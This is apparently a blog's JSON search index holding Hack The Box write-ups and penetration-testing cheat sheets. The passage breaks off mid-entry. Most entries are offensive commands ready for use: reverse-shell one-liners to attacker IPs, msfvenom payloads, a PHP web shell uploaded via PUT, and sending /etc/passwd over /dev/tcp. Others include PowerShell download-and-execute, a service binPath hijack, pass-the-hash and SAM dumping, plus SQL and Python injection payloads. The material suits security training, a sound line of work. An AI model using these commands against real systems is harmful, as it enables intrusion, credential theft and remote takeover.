var store = [{
        "title": "Passage - Hack The Box",
        "excerpt":" Passage is machine where use a vulnerability in the web system, use a bad configuration of ssh keys and a d-bus configuration to gain root access. NMAP Using nmap we see a open ports 22 e 80  In the page don’t have nothing, but in source code is found a directory and emails.   Accessing the directory, seen to be a news management system, based in this version of the system, have a rce vulnerability. RCE Vulnerability: https://www.exploit-db.com/exploits/48800CVE: https://nvd.nist.gov/vuln/detail/CVE-2019-11447  Modifying the exploit and run, we get a reverse shell.  User Searching in the directories of the www-data user, found a directory with emails files.  But is on base 64, making the decode, found a sha256 hash.  Now hashcat can be use to decrypt the hash, of the user paul.  Now have the access to flag. The user flag is on /home/paul/user.txt . ROOT Search in ssh keys, the user nadav share de id_rsa with the user paul, so can use de id_rsa to acess the user nadav. ssh -i id_rsa nadav@10.10.10.206Now i’m the user nadav, search in the home directory, found a .viminfo.  The groups are modified. Using this we can with a sudo user (nadav), overwrite files with permission root. Source: https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ Using this command is possible copy the id_rsa of the user root. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/id_rsa true&lt;method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/id_rsa trueNow the id_rsa of the root, use the same method used before to gain acess. ssh -i id_rsa root@10.10.10.206 ","categories": ["writeups"],
        "tags": ["htb","d_bus","configuration","web","ssh"],
        "url": "http://localhost:4000/writeups/2021/12/24/passage.html"
      },{
        "title": "Baby interdimensional internet - Hack The Box",
        "excerpt":" Baby is a easy machine, created by the Synack Red Team Track, to read the source code, manipulate post requestions and in inject commands, in flask application Web Page Initialy we see a web page where has a number.  Search in source code, a directory /debug, in commented.  In this directory has a source code from a flask application. Has two accepted methods, POST and GET, with two parameters “accepted” and “accepted”.  Now we can in burp, using repeater, send a post requestion to application. The application is vulnerable to a command injection, we can sen a exec command to python that will run the command and return the code.  Observations HTTP HEADERHave to add the content-type, to work the request.Font: https://www.geeksforgeeks.org/http-headers-keep-alive/ content-type: application/x-www-form-urlencodedPython exec PayloadFont: https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html eval('__import__(\\'os\\').popen(\\'ls\\').read()')","categories": ["writeups"],
        "tags": ["htb","burpsuite","flask"],
        "url": "http://localhost:4000/writeups/2021/12/29/htb-writeup-baby-interdimensional-internet.html"
      },{
        "title": "Baby sql - Hack The Box",
        "excerpt":" Baby is a medium machine, your challenge is the escape caracter, from the php functions, where you need to test, to see what is valid. And try the sql command that are valids from database. Web Page Initialy we see a web page where has a php code, and a sql command, that receive a post parameter.  Now we can try a sql injection.But first we have to know what those functions in php code does.addslashes: https://www.php.net/manual/en/function.addslashes.phpvsprintf: https://www.php.net/manual/en/function.vsprintf.php The addslashe, basically add a slash to scape in a string, so will does this: $pass = addslashes(\"passs'\")echo $pass# result = pass\\'The vsprintf will format a string: $pass = addslashes(\"passs'\")echo $pass# result = pass\\'vsprintf(\"SELECT * FROM users WHERE password=('$pass') AND username=('%s')\", 'admin')# result = SELECT * FROM users WHERE password=('pass\\'') AND username=('%s')\", 'admin')But if use the %1$ the / will be retired. The 1 reference the \\, add was added by addslashes, but the \\ is a invalid reference, so is removed. $pass = addslashes(\"pass%1$'\")echo $pass# result = pass%1$\\'vsprintf(\"SELECT * FROM users WHERE password=('$pass') AND username=('%s')\", 'admin')# result = SELECT * FROM users WHERE password=('pass'') AND username=('%s')\", 'admin')No we can do the sql injection.  Now the table is know.  ","categories": ["writeups"],
        "tags": ["htb","sql_injection","escape_character","POST"],
        "url": "http://localhost:4000/writeups/2021/12/29/htb-writeup-baby-sql.html"
      },{
        "title": "Breaking grad - Hack The Box",
        "excerpt":" Breaking grad is a medium/hard machine thats need knowledgment of prototype pollution, where we can abuse of a js funtion that has a bad validation of objetc parameters. Web Page Initialy we see a web page where has a choose of a person e return, and say if has pass or not. But don’t seem to have anything.  So we can check the files, seems to be a js, using express. Checking the routes, has the /api/calculate that check and return that message to screen. And have a /debug/:action  Debug seems to be interesting, let’s check the DebugHelper.js. The function receive a command that execute and returning something.  Let’s check the fork function. fork function: https://nodejs.org/dist/latest-v6.x/docs/api/child_process.html#child_process_child_process_fork_modulepath_args_options This function receive a object. execPath &lt;string&gt; Executable used to create the child process.execArgv &lt;Array&gt; List of string arguments passed to the executable. Default: process.execArgvThe function receive this parameters that can execute in the server. But the __proto__ is filtered, in objectHelper.js.js, but  the constructor.prototype not, and do the same thing. fucntion proto : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto  Send a object, with the parameters accepted by fork, will execute the command. That will be write in /debug/version. Heavily inspired by https://y3a.github.io/2021/06/15/htb-breaking-grad/ ","categories": ["writeups"],
        "tags": ["htb","prototype_polluition","POST","js"],
        "url": "http://localhost:4000/writeups/2021/12/30/breaking-grad.html"
      },{
        "title": "Infrastructure recon",
        "excerpt":"Scanning Search Whois whois is a tool to find who control the domain and where is register. Useful find the ip range.   IANA whois: Search in web.whois google.comwhois 172.16.0.100 #Return the ip rangeRDAP Substitute of whois, your return is in json.   Client RDAP: Web client RDAP.host Command to find the ip of a domain. host google.com #Return the ipBGP/ASN BGP Border gateway protocol is useful to find the ips ranges and asn.   bgpview: Web client to search bgp by IP.ASN Autonomous System Number consists of blocks of IP addresses that are administered by a single organization, but cold has more. amass intel -asn 28000 #Return the domains of the specific asnamass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500'' #Search all asn from paypal and search all domains of every asnecho 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\\+\\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew' #Using metabigor OSINT toolShodan Like a google to hackers.Exemplos:   Operators:          hostname: specific url      os: operational system      port: port      ip      net: by network      country      city      geo: geocalization      org: organization      ” “ : specific word        Pesquisas:          webcam country:us      hostame:bgoogle.com      ip:37.59.174.225      net:37.59.174.224/28      port:10001 tanque country:us      port:3306 os:Windows country:us      port:445 country:br accountability        API: Has a API to command line and integrations, required account.Censys Work like shodan.Exemplos:   Has operators and filters  ip:[172.10.100.50 to 172.10.100.239]  172.10.100.224/28  location.country_code:US AND metadata.os:UBUNTU AND 80.https.get.title:”index of”  location.country_code:US AND metadata.os:UBUNTU AND 80.https.get.title:”Adminnistration”  location.country_code:US AND metadata.os:UBUNTU AND ports:3306CRT.SH Log register of certifications, useful to search domains and subdomains: curl -s \"https://crt.sh/?q=%25.att.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | httpx -title -silent | anew subdomainsDNS   Register types:          SOA: Main register      A: IPv4      AAAa: IPv6      NS: Name servers      CNAME: Canonical name(Alias/apelido)      MX: Mail exchange(email)      PTR: Poiter (A reverse / Translate IP to name)      HINFO: Host informations      TXT: Return information in text        Reverse DNS          Ip to name        for ip in $(seq 1 239); do host -t ptr 172.20.1.$ip;done # Translate                    DNS zone transfer Has always at least 2 DNS server that contains the registers, and they have to stay synchronize.   host -t ns google.com -&gt; List the dns servers  host -l -a google.com ns2.google.com -&gt; Try transfer one to anotherPassive recon   virustotal.com  dnsdumpster.com  securitytrails.comTrace route Useful to identify the route, discover the OS based in ttl(TCP protocol) and border firewalls. traceroute gooogle.comParameters:   -w 3 : Waiting time  -m 1 : TTL number  -f 15 : Start of route  -I : Change of UDP to ICMP.  -T : USE TCP protocol.  -p 53: Port.Active hosts/Ping Sweep Useful to check the hosts that are alive. fping -a -g 172.16.1.0/24nmap -sn 172.100.100-239 -oGnmap -v -sn 172.16.1.0/24 #Hosts of a rangeTCP ports nmap -v -sS -p- -Pn 192.168.0.11 # -p- all ports, Types:   TCP connect: Complete the three-way hanshake, consume more traffic and easily detectable.          Nmap: -T        Half open/syn scan: Don’t complete the twhs, after the syn/ack, is send RST to cancel the connection. More furtive.          Nmap: -S      Nmap parameters: -U : UDP protocol.-v :Verbose-p80,8080,22 :Select ports to scan-g 80 :Origin port-D RND:20 :Create randon IPS-D 10.2.12.2.34,192.168.0.23 :Set the IP origin-A :Agressive use the nse scripts and more.-T1 to -T5 :Speed choice.-V :Run scripts.--top-ports:100 : Check the top 100 ports.-oG output.file :Output and grepable-iL : List of hosts-p http* : Port that use http-O : OS detectUDP ports Apresent more diifult responses and not so reliable.   Open port : No response  Close port : Port unreachable  Port with firewall drop : No response  Port with firewall reject : Port unreachable    nmap -v -sUV 172.16.1.4      OS fingerprint   TTL : Ping or another.          Linux: 64      WIndows: 128      FreeBSD: 65      Solaris: 255      Cisco: 254      Subdomains Example with a few tools. chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 &gt;&gt; assetfinder1 ; subfinder -d $1 -o subfinder1 -silent ; cat assetfinder1 subfinder1 chaos1 &gt;&gt; hosts ; cat hosts | anew clearDOMAIN ; httpx -l hosts -silent -threads 100 | anew http200 ; rm -rf chaos1 assetfinder1 subfinder1Tools do find subdomains:   chaos  securitytrails  assetfinder  subfinder  crt.sh  github-domains.pySPF - Sender policy framework Identify the servers allowed to send email with your domain.   host - t txt google,com -&gt; Find the active rule          Sem registro: It’s vulnerable.      v=spfl include:google.com ?all -&gt; vulnerable (neutral)      v=spfl include:google.com ~all -&gt; vulnerable (identified as suspect)      v=spfl include:google.com -all -&gt; Safe configuration.      ","categories": ["cheatsheet"],
        "tags": ["pentest","methodologies","recon","scanning","infrastructure"],
        "url": "http://localhost:4000/cheatsheet/2022/01/12/infrastructure.html"
      },{
        "title": "OSINT",
        "excerpt":"Passive vs Active   Passive recon is when the information is get through data sources without direct connection to the target.  Active is when the recon is done direct, and logs of our access is created.Passive   theharvester: A OSINT tool that do passive search in multiples data sources. Google dorks, apis, Hunter, securitytrails, Trello,…Search employees Linkedin is the best site to search. What search?   Job offers: Technologies that are requested in job offers.  Employees: In jobs list can be able to see the technologies used.Emails   hunter.io: Search emails based in domains.Leaks   haveibeenpwned: Check if a emails has been leaked.  Deep web: Check by password and emails leaks.  Karma: Automation of tor searchs.Sites search Pastebin   In google: site:pastebin.com “redacted.com”Trello   In google: site:trello.com “redacted.com”Similar domains   urlcrazy: Search by similar domains.Wayback machine Wayback is a cache of sites, is possible find old versions.   waybackurls: Find URLS of wayback machine      cat domains.txt | waybackurls &gt; urls        gau: Find URLS of wayback machine, Open Threat Exchange and Common Crawl.      cat domains.txt | gau --blacklist jpg,png,css --json        gauplus: Modified version of gau.      cat domains.txt | gauplus      Google dorks   site: In a specific site.  inurl: Search url.  intitle: In title.  intext: Inside the text.  filetype: By a filetype.  ext: By extension..  cache: Search in cache.  Operators;  ” “ : Search exactly.  ’- google.com’ -&gt;Blacklist.  Exemples:          site:redacted.com -www ext:php -&gt; Blacklist www and search by php extension.      site:redacted.com intitle:”Admin”.      site:redacted.com “index of” backup -&gt; List directories.      :redacted.com filetype:txt password      :redacted.com filetype:xls password      filetype:txt inurl:password      cache:Old address to search.      filetype:sql :gov.uk      filetype:old :gov.uk intitle:”index of”      :gov.uk filetype.ovpn      :gov.uk filetype:old intitle: “index of”      Dorks database: Exploitdb database of dorks.      NDN - Non Delivery Notification Send a email to a address, can be a invalid, and the server email respond. The email can have useful informations. Metadata Analysis of files to found informations about the aplication and host that create it.   metadata2go: Online tool to analysis a file.  ExifTool - Tool to make a analysis of file.","categories": ["cheatsheet"],
        "tags": ["pentest","osint","information_gathering"],
        "url": "http://localhost:4000/cheatsheet/2022/01/12/osint.html"
      },{
        "title": "Enumeration",
        "excerpt":"Enumeration Brute force directory/pages/files gobuster dir -e -u 172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt -s \"200,301,302,401\" .gobuster dir -e -u http://172.16.1.10/turismo -w /usr/share/wordlists/dirb/small.txt -x .php,.txt,.sql,.bkp  #Search by extensions.gobuster dir -e -u 192.168.0.7 -w wordlist -x .php -c cookie # Pass cookieAnother tools:   Dirsearch  Dirb  DirbustersFile extensions to search:    - Web :.pl,.cgi,.sh,.php,.jsp,.asp,.aspx,.js,.html,.nm    - Backups:.bkp,.bak,.sql    - Files:.pdf,.txt,.conf,.xml Robots.txt/sitemap.xml are importants file that contains directories that are not indexed. Methods allowed curl -v -X OPTIONS http://172.16.1.10/ # Will show all methodsPut method curl -v -X PUT -d \"&lt;?php system(\\$_GET[\"cmd\"]); ?&gt;\" http://172.16.1.10/webdav/shell.phpFTP Commons credentials:   User:anonymous, pass:anonymousSMB Permit share directories and files. Port 139 -&gt; NetBIOS, port 445 -&gt; SMB over TCPLinks:   Hacktricks SMBWindows nbtstat -A 172.16.1.4 # show name, group, etc...net view \\\\172.16.1.5 # Try to connectnet view \\\\172.16.1.5 \"\" u:\"\" # Null session logonnet use h: \\\\172.16.1.5\\opt # Mount the folder in h:nbtstat -c # Cache of all old connections#Python brute forcefor /f %i in (passwords.txt) do net use \\\\172.16.1.4 %i /u:johnLinux nbtscan -r 172.16.1.0/24 # Search in rangesmbclient  -L \\\\172.16.1.5 -N # Connect in anonymous modesmbclient   //172.16.1.5/_DOCS -N # Connect in a directorysmbclient  -L \\\\172.16.1.5 -N —option='client min protocol=NT1' # Sometimes can have a version incompatibility with older versionscrackmapexec smb 192.168.10.11 -u Administrator -H &lt;NTHASH&gt; -x whoami #Pass-the-Hashcrackmapexec smb 192.168.10.11 -u Administrator -p 'password' -x whoami #Execute cmdcrackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sam #Dump SAMAutomatic enumeration : enum4linux enum4linux -U 172.16.1.5 # Without usersenum4linux -a 172.16.1.5 # AllRPC Remote proccedure call API to call commands in another machines. rpcclient -U \"\" -N 172.16.1.5 # Anonymous login# After connectenumdomusers # Enumerate usersqueryuser jonhNFS Network file system Protocol to share files. Port 2049 rpcinfo -p 172.16.1.5 | grep nfs # Check versionsshowmount -e 172.16.1.5 # Show sharedmount -t nfs -o nfsverscat=2 172.16.1.5:/ /tmp/nfs #Mount the nfsSNMP Simple Network Management protocol Protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…). Ports: 161,162,10161,10162/UDPLinks:   Hacktricks snmp  objectid listonesixtyone -c comu.txt 172.16.1.0/24 # Search by open hosts with communitiessnmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25  # Search with public community and specific codesnmp-check 172.16.1.4 -c public # Show info of hostWAF Web application firewall WAFW00F google.com","categories": ["cheatsheet"],
        "tags": ["pentest","methodologies","recon","enumeration"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/enumeration.html"
      },{
        "title": "Exploitation",
        "excerpt":"Public exploits Links:   Exploitdb  packetstormysecurity  securityfocus  CVE MitreSearchsploit searchsploit webminsearchsploit webmin —exclude=\"php|Dans\"searchsploit -e webmin :searchsploit ipfire —id -m 42149 Important!   Always check the payloads.  Check the dependencies libs,dll’s…  Always test before execute in the target.Wordlists   Seclist  assetnoteReverse shell nc -nlvp 4444 # Open portbash -i &gt;&amp; /dev/tcp/172.100.50.0/4444 0&gt;&amp;1nc -e /bin/bash 172.100.50.0 4444/bin/sh | nc 127.0.0.1 5555rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.100.50.0 4444 &gt;/tmp/f # OpenBSDpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.20.1.21\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.100.50.0 LPORT=4444 -f exe &gt; reverse.exe # Meterpretermsfvenom -p windows/meterpreter/reverse_tcp LHOST=\"172.100.50.0\" LPORT=4444 -f asp &gt; shell.aspmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\"172.100.50.0\" LPORT=4444 -f raw &gt; shell.jspmsfvenom -p php/meterpreter/reverse_tcp LHOST=172.100.50.0 LPORT=4444 -f raw -o shell.phppython3 -c 'import pty; pty.spawn(\"/bin/sh\")' # Interactive shellperl -e 'exec \"/bin/sh\";'ruby: exec \"/bin/sh\"Mutations john —wordlist=file —rules —stdout &gt; mutacao # New wordlist with variations of the firstnano /etc/john/john.conf → wordlist mode rules # Mutations personalized rules    # ^[0-9] : 0 to 9 in the begin    # $[0-9] : 0 to 9 in te final    # $[@]$[0-9]$[0-9] : Add @ + 2 numbers in the end.cewl google.com -m 7 # Find every word in the page with the lenghtcrunch 10 10 -t rogerio^%% -o wordlist # List based in patterns    # % : Numbers.    # ^ : Special character.    # @ : Lower case character.    # , : Capital character.Key space brute force All the possible variations. crunch 4 4 0123456789 -o pin # All combinations with 4 digits.crunch 6 6 -f charset.lst numeric -o pin # Use the crunch numeric patternBrute force hydra -v -l rogerio -p admin 172.16.1.60 sbm #SMBhydra -v -L users.txt -p pass.txt 172.16.1.60 sbm hydra -v -L users.txt -P pass.txt -M alvos.txt sbmhydra -L rdp_users.txt -P rdp_pass.txt rdp://172.16.1.188 -I -t 1 #RDPhydra -v L users.txt -p admin 172.16.1.5 sshhydra -v -L users.txt -P password 172.16.1.5 -t 1 -W 5    # -s : Set port.    # -t : Threads.    # -W : Sleep time beetwen tasks.WinRM Link:   [winrm-penetration-testing]https://www.hackingarticles.in/winrm-penetration-testing/Windows Remote Management, is a command-line tool that enables administrators to remotely execute the CMD.exe commands using the WS-Management protocol. Port 5985/HTTP, 5986/HTTPS.Evil-WinRM    evil-winrm -i 172.16.1.140 -u user -p password      RDP Active or disable rdp in windows   Active          reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f      netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes        Disable          reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f      netsh advfirewall firewall set rule group=”remote desktop” new enable=No      crackmaexec Swiss knife for pentest crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username -p passwordcrackmaexec smb 172.16.1.0/24 -u jonh -p 'jonh@10' # Scan the network to the test all loginscrackmaexec smb 172.16.1.60 -u jonh -p 'jonh@10'  -x 'whoami' # Execute this commandcrackmaexec ldap 192.168.1.0/24 -u user -p 'jonh@10'crackmaexec ldap 192.168.1.0/24 -u user -H hashexemplecrackmaexec mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforcecrackmaexec winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforceBuffer overflow Pattern offset /usr/bin/msf-patter_create -l 2200 # Create pattern/usr/bin/msf-pattern_offset -l 2200 -q 43396f43 # Find EIP overwriteShellcode msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.16 lport=443 exitfunc=thread -b \"\\x00\" -f cGDB/Linux gdb -q ./fileinfo functions               # Show functionsset disassembly-flavor intel # Set flavordisas main                   # Dissasembly specific funtionb* 0x5655621f                # Breakpointrun &lt; &lt;(python -c 'print \"A\" * 200') # Input datai r                          # Show registers(esp,eip,...)x/16xw $esp                  # Specific memory zonebreak main                   # Brakpoint in the funtionset $eip = 0x56556982        # Jump to specific function/zonepython -c 'print \"A\" * 136 + \"BBBB\" + \"\\x70\\x62\\x55\\x56\"' | ./file # Send a specific number, that will allow overwrite and redirect the EIP.","categories": ["cheatsheet"],
        "tags": ["pentest","exploitation"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/exploitation.html"
      },{
        "title": "Linux",
        "excerpt":"Linux enumerate man # manual of programspwd # Actula path.mkdir #  Create directoriesls # List file- ls -l # Show permissions, users and group, lenght and date- ls -a # List hide files- ls -la # List hide and permisionstouch # Create a fileecho # Write in screen- echo exampletext &gt; file # Save in a filecat # Read the filecp # Do a copymv file file1 # Move/rename the filehead # Read the first 5 linestail -f arquivoexemplo # Show in real time the end of file## Users/ect/passwd # Users list fileadduser nome # Create userdeluser nome # delete useradduser nome sudo # Change permission to sudo cat /var/log/auth.log # log of authentications Networks ifconfig # Network informationsservice serviceexample restart # restart a servicenetstat # Network open ports and configurationstraceroute # Trace the packages using TTL(Time to live).hping3# MOst complete ping, can use SYN, port, etc.host# Identify DNS.netcat # Interacte and communicate with others services- nc 10.0.0.0 443 - nc vlp port # Open the port and listenin- nc -vnlup port # Open udp port- nc -vnu ip # Connection UDP- nc -v ip port &lt; file # Send a file.- nc -vnlp port &gt; file # Receive a file.- Portscan    - nc -vnz ip port # Ports and show the service. (z - scan)    - nc -vnz ip port-port     - for porta in $(cat filetextports);do nc -vnz ip $porta;done # Sacn in a range- honeypot    - while true;do nc -vnlp 21 &lt; 21.txt &gt;&gt; 21.log 2&gt;&gt; 21.log;done # SHow a false banner, capture and save the commands and errorsReverse shell - nc -vnlp port # - nc.exe vn ip port -e cmd.exe Bind shell- nc -vnlp port -e /bin/bash - nc.exe -vn ip port # Victim - Open the port and receive shell-ncat # Use cryptography- openssl req -x509 -newkey rsa#2048 -keyout chave.pem -out cert.pem -days 10 # Create a key to comunicate- ncat -vnlp 8443 —ssl-key chave.pem —ssl-cert cert.pem # Open the ssl port- ncat -vn 192.168.0.200 8443 —ssl # Victim- ncat -vnlp 8443 —ssl-key chave.pem —ssl-cert cert.pem —allow 192.168.0.26 # AttackSocat- socat - tcp4-listen#2222 # Open port- socat - tcp4:19.168.0.200:4040 # Connect to ip port- socat - tcp4:19.168.0.200:4040 EXEC:/bin/bash # Send bashTelnet- telnet google.com 21 #  Connect to port- telnet 172.20.1.74 4444 | /bin/bash | telnet 172.20.1.73 4445 # Shell reverse, send bash to 4444, and bash output to 4445/dev/tcp- echo \"teste\" &gt; /dev/tcp/192.168.0.4/4545 # Open a tcp socket- cat /etc/passwd &gt; /dev/tcp/192.168.0.4/4545 - &gt;/dev/tcp/192.168.0.4/4545 # Connect to a machine- bash -i &gt;/dev/tcp/192.168.0.4/4545 0&gt;&amp;1 2&gt;&amp;1 # Send a bash to attackin machine/Reverse shellTor # service start tor- proxychains# /etc/proxychains.conf    - socks5 127.0.0.1 9050    - dynamic_chain    - Navegador # Manual proxy 127.0.0.1 9050, check proxy dnsServices update-rc.d service enable # Save a service to boot  Localizar / Output locate fileexample # Locate a fileupdatedb # Update locate databasewhereis programexample # Locate programswhich programexample # Locate binariesgrep \"bin/bash\" /etc/passwd # Search by a specifi linegrep \"bin/bash\" /etc/passw &gt; exemple grep -v \"nologin\" /etc/passw # Exclude the specific linesegrep -v \"nologin | /bin/false\" /etc/passw awk -F # '{print $1,$3}' /etc/passwd # Show based in a filtercut -d -f1,f2 # Cut and show a specificsed 's/wrong/right' filelocal # Replace ocurrencies in a filesort # Adjust the ouitputuniq # Delete all repeated occurencies(do sort before)- uniq -c # Count lineswc # CountPrivilege escalation commands - wc -l # Count the lines- cat  /etc/passwd # Users- hostname # Mchine name- uname -a # Kernel version x86/x64- cat /etc/issue # SO version- cat /etc/*-release # More complete SO informations- dpkg -l # List programs and verions- ifconfig -a # Network and adpters- route # Route table and gateway- netstat -nlpt # Open ports- netstat -nlpu # UDP open ports- ps -aux # Show running proccess- cat /etc/crontab # Show as scripts and commands schedule- find / -writable -type d 2&gt;/dev/null # Show directories with write permission- find / -perm -u=s -type f 2&gt;/dev/null # Show programs that are executable - sudo -l # With sudo permissions","categories": ["cheatsheet"],
        "tags": ["pentest","os","linux"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/linux.html"
      },{
        "title": "Pentest process",
        "excerpt":"Pentest is a process that has various steps, and require attention at all attack vectors. So methodologies were created to establish a standard, these are the main methodologies:   PTES - The Penetration Testing Execution Standard  OWASP- The Open Web Application Security Project  NIST - National Institute of Standards and Technology  OSSTMM- - The Open Source Security Testing Methodology ManualThese pages are in constant updates.   Recon:          Subdomains      Enumeration      Infrastructure      Vulnerabilities      Automation        Osint  Web hacking  Exploitation  Post-exploration  Operational sistems:          Linux      Windows        ReportsTheses steps will be explained. Infrastructure -&gt; Tools/Commands   Reconnaissance          Search IP ranges      Search BGP/ASN      Search Whois      Search RDAP      Search Shodan/Censys      Search em crt.sh      Search direct/reverse DNS      Search DNS zone transfer      Passive search                  virustotal          dnsdumpster          securitytrails                    Traceroute      Active hosts      Open TCP ports      Open UDP ports      Services running in active ports      OS fingerprint      Identify possible defenses      Search SPF      Subdomains      Search by subdomain takeover      Enumeration -&gt; Tools/Commands   Ambient analysis          Robots.txt/sitemap.xml      Brute force Directory/Pages/Files      Mirror website/Code analisys      Webserver/Accepted methods      WAF      SMB      RPC      SNMP      NFS      Indentify parameters      Bad configurations      Sensible data/default credentials      Osint -&gt; Tools/Commands   Information Gathering - Business          Search employees      Search Job offers      Search email address      Search users patterns      Search leaks      Search data in deepweb/Pastebin/Trello      Wayback machine      Google/Bing/Duckduckgo dorks hacking      Non Delivery Notification      Search by metadata in files      Write down any important information      Web hacking -&gt; Tools/Commands   SQL Injection.  XXE  Broken access control  XSS  Command Injection  LFI  RFI  IDOR  SSRF  CSRF  Inputs  Template injection  Subdomain TakeoverExploitation -&gt; Tools/Commands   Buffer Overflow  Public Exploits  Reverse shellPost-exploration -&gt; Tools/Commands   Enumeration  Privile escalation  PivotingReport ","categories": ["cheatsheet"],
        "tags": ["pentest","methodologies"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/pentest.html"
      },{
        "title": "Post exploitation",
        "excerpt":"Privilege escalation SSH ssh-keygen -f user # Attack# Victimmkdir  (home/)~www-data/mkdir ~/.ssh/touch ~/.ssh/authorized_keysecho \"public_key\" &gt; ~/.ssh/authorized_keysssh www-data@172.0.0.1 -p 2222 -i userWindows Automatized   winPEASMandatory level   whoami /groupsServices wmic service # List serviceswmic service get Name,Sate,PathName | findstr \"Running\" # Running servicessc query servicename # Informations about a service sc qc servicename # Service configurationssc config servicename binPath=\"certutil -urlcache -f priv.exe\" # Change the path of the filesc start servicenameLinux Automatized   linPEAS  gtfobins  linux-exploit-suggesterSUID/GETUID find / -user root -perm -4000 -print 2&gt;/dev/null Permissions sudo -l # Programs that run as sudofind / -type f -perm 777 2&gt;/dev/null # Files with permissionsls /etc/cron.* # Check all crontab foldersuname -l # Kernel and SO versionscat /etc/issueTransfer files python -m SimpleHTTPServer 80 #Open serverpython3 -m http.server 80# Windowscertutil.exe -urlcache -f [http://172.20.1.6/file.exe](http://172.20.1.6/file.exe) file.exepowershell.exe wget [http://172.20.1.6/file.exe](http://172.20.1.6/file.exe) -OutFile file.exepowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe')powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/poc.txt') # Read and execute # Windows hex/usr/share/windows-resources/binaries/upx -9 exec.exe # Compressexe2hex -x exec.exe -p exec.txt # To hexnc -l 10.10.10.10 4444 &lt; exec.txt# Linuxwget http://172.20.1.6/file.exe -O /tm/file.execurl http://172.20.1.6/file.exe -o file.exescp /source/folder/scp.zip root@191.162.0.2:/destiny/folder #sshTunneling # Windows nc.exe -vnlp 5555 -s 127.0.0.1 -e cmd.exe # Attackerplink.exe -ssh -l user -pw root -R 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 # Victimnc -v 127.0.0.1 1337 # Attacker# Linuxsocat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddrsocat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22ssh www-data@172.0.0.1 -p 2222 -i us -L 3333:127.0.0.1:3306Pivoting Meterpreter ipconfig # Networks interfaceroute # Identify networkrun autoroute -s 10.0.20.0/24 #Add a route to our machineuse auxiliary/server/sock4a # Create a proxy in port 1080nano /ect/proxychains.conf # Add this proxy to proxychainsproxychains nmap -v —open -sT -p 110,139 -Pn 10.10.20.0/24 # The network is visibleVportfwd add -l 110 -p 110 -r 10.20.20.4 # Portfoward  a specific portnmap -sV -p 110 127.0.0.10 # Can acess this portInternal pentest Responder A LLMNR &amp; NBT-NS Spoofing Attack. vim /etc/responder/Responder.conf # Configure the ips field RespondToresponder -I eth0 -Prv # Will list to all","categories": ["cheatsheet"],
        "tags": ["pentest","post-exploitation","exploitation"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/post-exploitation.html"
      },{
        "title": "Web pentest",
        "excerpt":"Web hacking Attack vectors   Parameters  Search inputs  Login/athentication inputs  Fields/register inputs  Redirects  GET e POST parameters  Download  UploadSQL Injection. Use sql commands that are not sanitized do retrieve database informations:Links:   Cheat sheet  Portswigger  w3schoolsSql sintax examples(mysql): select user(); --Show usercreate database test;  use test;show tables;create table users(id int primary key auto_increment,login varchar(20) not null,passwords vasrchar(20) not null);describe users;select id from users;insert into users values('1','admin','admin');select * from users;select * from users where id=\"1\";select concat(login,':',passwords from users) -- CONCATENATE selects.select @@versions -- Show database versionselect load('/var/www/html/index.html') -- Load a file.select sleep(5) -- Sleep 5 sec until return.select substring(\"test\",1,3)use mysql; --System database that has informations about users,...use information_schema; --System database, has informations about created databases, tables, columns.SQL Information Schema 172.16.1.10/turismo/agencias.php?loja='union select 1,2,table_name,4,5 from information_schema.tables' 172.16.1.10/turismo/agencias.php?loja='union select 1,2,table_name,4,5 where table_schema =\"dbname\"%23' 172.16.1.10/turismo/agencias.php?loja='union select 1,2,column_name,4,5 where table_schema =\"dbname\" and table_name=\"dbusers\"%23' 172.16.1.10/turismo/agencias.php?loja='union select 1,2,nome,login,senha from dbusers %23' .172.16.1.10/turismo/agencias.php?loja='union select 1,2,concat('id=',id,'Login=',login,'pass=',password)4,5 from mrudbuserssers %23' 172.16.1.10/turismo/agencias.php?loja='union select 